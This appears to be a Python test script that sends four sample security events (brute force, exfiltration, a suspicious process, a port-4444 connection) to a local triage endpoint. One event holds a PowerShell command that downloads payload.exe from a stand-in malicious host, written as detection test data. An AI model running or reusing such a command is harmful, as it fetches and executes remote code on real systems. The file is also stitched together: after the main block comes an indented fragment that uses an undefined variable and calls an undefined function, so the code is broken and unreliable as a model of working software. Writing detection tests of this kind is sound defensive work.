import json
import os

import requests


def main():
    base_url = os.getenv("TRIAGE_URL", "http://localhost:8001")
    test_cases = [
        {
            "name": "Brute Force",
            "event": {"user": "admin", "action": "login_failed", "source_ip": "192.168.1.100", "attempts": 15},
            "score": 0.92,
        },
        {
            "name": "Data Exfiltration",
            "event": {
                "user": "alice",
                "action": "file_read",
                "source_ip": "10.0.0.50",
                "file_path": "/sensitive/data.csv",
                "bytes_transferred": 1_048_576,
            },
            "score": 0.78,
        },
        {
            "name": "Suspicious Process",
            "event": {
                "user": "bob",
                "action": "process_exec",
                "process_name": "powershell.exe",
                "command_line": "Invoke-WebRequest http://malicious.com/payload.exe",
            },
            "score": 0.85,
        },
        {
            "name": "Unusual Network Connection",
            "event": {
                "user": "charlie",
                "action": "network_connect",
                "destination_ip": "203.0.113.45",
                "destination_port": 4444,
                "protocol": "TCP",
            },
            "score": 0.65,
        },
    ]

    for case in test_cases:
        payload = {"event": case["event"], "anomaly_score": case["score"], "model": "lof"}
        try:
            resp = requests.post(f"{base_url}/triage", json=payload, timeout=10)
            print(f"\n== {case['name']} ({resp.status_code}) ==")
            print(json.dumps(resp.json(), indent=2))
        except requests.exceptions.RequestException as exc:
            print(f"Failed to call triage endpoint: {exc}")
            break


if __name__ == "__main__":
    main()
        for key, value in triage['indicators'].items():
            print(f"  - {key}: {value}")
    
    if triage['recommended_actions']:
        print(f"\n✅ Recommended Actions:")
        for i, action in enumerate(triage['recommended_actions'], 1):
            print(f"  {i}. {action}")


if __name__ == "__main__":
    test_triage()
